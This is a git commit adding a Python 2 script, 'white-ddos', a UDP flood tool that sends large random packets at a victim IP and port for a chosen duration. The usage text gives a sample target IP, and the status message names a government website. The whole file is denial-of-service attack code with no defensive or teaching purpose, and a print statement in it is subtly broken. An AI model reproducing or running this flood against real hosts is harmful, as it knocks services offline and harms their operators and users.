8bf16e861d8ba7513efd8277f489233432de2dec
Cyber1995Xn <cyber1995ops@gmail.com>
2024-06-19 01:46:15 +0700

    Add files via upload

---
+++ Server.py
@@ -0,0 +1,45 @@
+import time
+import socket
+import random
+import sys
+import os
+
+os.system("git pull")
+os.system("figlet white-ddos")
+print "Tool Devoloped By WHITE_EAGLE"
+print "starting in 5 seconds....."
+time.sleep(5)
+
+os.system("clear")
+os.system("figlet Attack Starting")
+time.sleep(3)
+
+def usage():
+	os.system("figlet white-ddos")
+	print "Tool Devoloped By WHITE_EAGLE"
+        print "Usage : python2 white-ddos.py 196.220.60.200 80 100"
+
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;95mThe attack begins \033[1;95m \033[0;34mwww.gov.cn \033[0;37m\ \033[0;37m\On port \033[0;34m "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+    
